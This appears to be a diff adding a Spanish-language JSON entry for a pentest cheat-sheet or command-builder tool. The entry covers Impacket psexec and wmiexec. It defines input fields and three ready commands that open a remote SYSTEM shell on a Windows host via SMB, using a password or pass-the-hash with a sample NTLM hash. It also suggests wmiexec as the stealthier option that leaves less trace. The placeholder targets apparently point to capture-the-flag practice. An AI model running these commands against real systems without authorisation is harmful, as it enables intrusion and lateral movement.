@@ -1,0 +1,50 @@
+{
+ "id": "impacket-psexec",
+ "name": "Impacket – psexec.py / wmiexec.py",
+ "category": "Post-explotación / Active Directory",
+ "binary": "impacket-psexec",
+ "summary": "Ejecución remota de comandos y shell tipo SYSTEM en Windows a través de SMB (admin$), usando credenciales válidas o pass-the-hash.",
+ "questions": [
+  {
+   "id": "auth",
+   "type": "select",
+   "label": "Autenticación",
+   "options": [
+    {"id": "plain", "label": "Usuario y contraseña", "frag": ""},
+    {"id": "hash", "label": "Pass-the-hash", "frag": ""}
+   ]
+  },
+  {
+   "id": "target_plain",
+   "type": "text",
+   "label": "dominio/usuario:contraseña@IP",
+   "flag": "{v}",
+   "placeholder": "HTB.LOCAL/administrator:Password123@10.10.10.10",
+   "required": true,
+   "when": {"auth": "plain"}
+  },
+  {
+   "id": "target_hash",
+   "type": "text",
+   "label": "dominio/usuario@IP",
+   "flag": "{v}",
+   "placeholder": "HTB.LOCAL/administrator@10.10.10.10",
+   "required": true,
+   "when": {"auth": "hash"}
+  },
+  {
+   "id": "hashes",
+   "type": "text",
+   "label": "Hash NTLM (LM:NT)",
+   "flag": "-hashes {v}",
+   "placeholder": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
+   "required": true,
+   "when": {"auth": "hash"}
+  }
+ ],
+ "cheats": [
+  {"title": "Shell SYSTEM con credenciales (psexec)", "cmd": "impacket-psexec HTB.LOCAL/administrator:Password123@10.10.10.10"},
+  {"title": "Pass-the-hash (psexec)", "cmd": "impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HTB.LOCAL/administrator@10.10.10.10"},
+  {"title": "Alternativa más sigilosa (wmiexec)", "cmd": "impacket-wmiexec HTB.LOCAL/administrator:Password123@10.10.10.10", "note": "wmiexec no sube ningún binario a disco, deja menos rastro que psexec."}
+ ]
+}
